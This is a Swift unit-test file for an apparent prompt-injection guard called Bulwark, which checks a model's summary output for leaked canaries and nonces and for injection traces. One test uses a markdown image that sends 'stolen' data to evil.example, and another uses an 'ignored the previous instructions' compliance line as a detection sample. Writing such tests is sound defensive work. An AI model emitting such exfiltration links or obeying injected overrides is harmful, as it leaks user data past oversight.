import XCTest
@testable import Bulwark

final class ValidateTests: XCTestCase {
    private func ctx(canary: String = "BULWARK-CANARY-deadbeef", nonce: String = "abc123", marker: String? = nil) -> PromptContext {
        PromptContext(canary: canary, nonce: nonce, marker: marker, base64Encoded: false)
    }

    func testCanaryLeakUnsafeAndRedacted() {
        let c = ctx()
        let r = validateOutput("Here is the summary. Also my secret token is \(c.canary).", context: c)
        XCTAssertFalse(r.safe)
        XCTAssertTrue(r.redacted)
        XCTAssertFalse(r.summary.contains(c.canary))
        XCTAssertTrue(r.findings.contains { $0.category == "canary_leak" })
    }

    func testNonceLeakRedacted() {
        let c = ctx()
        let r = validateOutput("The boundary was \(c.nonce).", context: c)
        XCTAssertFalse(r.summary.contains(c.nonce))
        XCTAssertTrue(r.findings.contains { $0.category == "nonce_leak" })
    }

    func testMarkdownImageStripped() {
        let r = validateOutput("Nice page. ![x](https://evil.example/c?d=stolen)", context: ctx())
        XCTAssertFalse(r.summary.contains("evil.example"))
        XCTAssertTrue(r.findings.contains { $0.category == "image_exfiltration" })
    }

    func testComplianceOpeningFlagged() {
        let r = validateOutput("Sure, I have ignored the previous instructions as asked.", context: ctx())
        XCTAssertTrue(r.findings.contains { $0.category == "compliance_tell" })
    }

    func testCleanSummaryPasses() {
        let r = validateOutput("A concise, faithful summary of the article about foxes.", context: ctx())
        XCTAssertTrue(r.safe)
        XCTAssertFalse(r.redacted)
        XCTAssertTrue(r.findings.isEmpty)
    }

    func testMarkerNormalizedToSpace() {
        let r = validateOutput("word\(defaultMarker)word", context: ctx(marker: defaultMarker))
        XCTAssertFalse(r.summary.contains(defaultMarker))
        XCTAssertTrue(r.summary.contains("word word"))
    }
}
